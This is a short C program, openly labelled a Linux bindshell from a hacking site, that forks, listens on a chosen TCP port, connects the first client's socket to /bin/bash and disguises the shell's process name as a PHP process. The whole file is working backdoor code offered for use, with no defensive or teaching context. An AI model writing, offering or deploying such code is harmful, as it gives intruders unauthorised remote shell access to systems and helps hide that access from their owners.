/*
w4ck1ng x86 Linux Bindshell - w4ck1ng.com
Server Usage: ./bind <port>
Client Usage: (netcat) <host> <port>
*/

#include <stdio.h>
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char **argv)
{
int i;
int new,cli,new_len;
struct sockaddr_in serv_addr;
struct sockaddr_in cli_addr;
char *msg = "w4ck1ng x86 Linux Bindshell - w4ck1ng.com\n";

if (argc < 2) {
printf("%s <port>\n", argv[0]);
return 1;
}

if( fork() == 0 )
{
serv_addr.sin_family = AF_INET;
serv_addr.sin_port = htons(atoi(argv[1]));
serv_addr.sin_addr.s_addr = htonl (INADDR_ANY);

new = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
bind( new, (struct sockaddr *)&serv_addr, sizeof(serv_addr) );
listen(new, 1);

new_len = sizeof(cli_addr);
new = accept(new, (struct sockaddr *)&cli_addr, &new_len );
for(i = 2; i >= 0; i--)
dup2(new, i);
send(new,msg,strlen(msg),0);

execl( "/bin/bash", "/usr/bin/php index.php", NULL );
setenv ("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin/:.", 1);
unsetenv ("HISTFILE;");
}
}
